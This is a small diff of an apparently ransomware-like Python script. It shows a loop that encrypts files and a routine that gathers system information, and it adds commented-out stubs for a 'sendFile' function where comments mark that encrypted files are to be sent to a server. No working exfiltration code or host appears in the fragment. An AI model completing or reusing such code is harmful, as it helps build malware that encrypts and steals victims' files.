@@ -35,6 +35,7 @@ extendedPath = path + extend
 ### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
 ### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
 ### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
+# def sendFile():
 
 
 ### This creates a document that contains useful system information and specifications ###
@@ -148,8 +149,7 @@ for encryptingFile in filesToEncrypt:
         f.write(encrypted)
 
     ### SEND ENCRYPTED FILES TO SERVER HERE ###
-    ### SEND ENCRYPTED FILES TO SERVER HERE ###
-    ### SEND ENCRYPTED FILES TO SERVER HERE ###
+    #sendFile()
     count += 1
 
 time.sleep(120)
